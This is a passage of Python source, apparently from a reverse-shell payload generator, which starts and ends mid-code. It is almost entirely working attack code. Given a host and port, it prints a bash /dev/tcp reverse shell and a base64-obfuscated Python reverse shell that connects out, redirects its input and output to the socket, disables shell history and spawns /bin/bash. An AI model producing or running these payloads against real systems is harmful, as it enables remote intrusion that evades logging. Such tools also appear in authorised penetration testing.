...
if len(sys.argv)  == 4:
    if sys.argv[3] == 'netcat':
        ...
        print(Style.BRIGHT + Fore.BLUE + 'exec 69<>/dev/tcp/{}/{}; while read -r command; do $command >&69 2>&69; done <&69\n'.format(sys.argv[1], sys.argv[2]))
        ...
        CODE = '''import socket, os, pty; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('{}', {})); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; os.putenv("HISTFILE", '/dev/null'); pty.spawn("/bin/bash")'''.format(sys.argv[1], sys.argv[2])
        print(Style.BRIGHT + Fore.BLUE + "python -c \"import base64;exec(compile(base64.b64decode(b'{}'),'<string>','exec'))\"".format(str(base64.b64encode(CODE.encode("utf-8"))).split('\'')[1]))
    elif sys.argv[3] == 'awk':
